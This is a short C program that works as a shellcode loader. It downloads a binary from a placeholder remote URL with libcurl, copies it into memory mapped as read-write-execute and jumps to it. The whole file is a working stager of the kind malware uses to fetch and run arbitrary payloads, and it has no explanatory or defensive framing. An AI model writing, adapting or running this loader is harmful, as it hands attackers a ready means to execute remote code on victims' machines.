#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <curl/curl.h>

#define SHELLCODE_URL "https://<DOMAIN>/shellcode.bin"

struct string {
    char *ptr;
    size_t len;
};

static size_t write_cb(void *data, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct string *s = userp;
    char *tmp = realloc(s->ptr, s->len + realsize + 1);
    if (!tmp) return 0;
    s->ptr = tmp;
    memcpy(s->ptr + s->len, data, realsize);
    s->len += realsize;
    s->ptr[s->len] = '\0';
    return realsize;
}

int main(int argc, char **argv)
{

    CURL *curl = curl_easy_init();
    if (!curl) return 1;

    struct string s = { .ptr = malloc(1), .len = 0 };
    s.ptr[0] = '\0';

    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

    CURLcode res = curl_easy_perform(curl);

    void *exec = mmap(NULL, s.len, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memcpy(exec, s.ptr, s.len);
    free(s.ptr);
    curl_easy_cleanup(curl);
    ((void(*)())exec)();
    return 0;
}
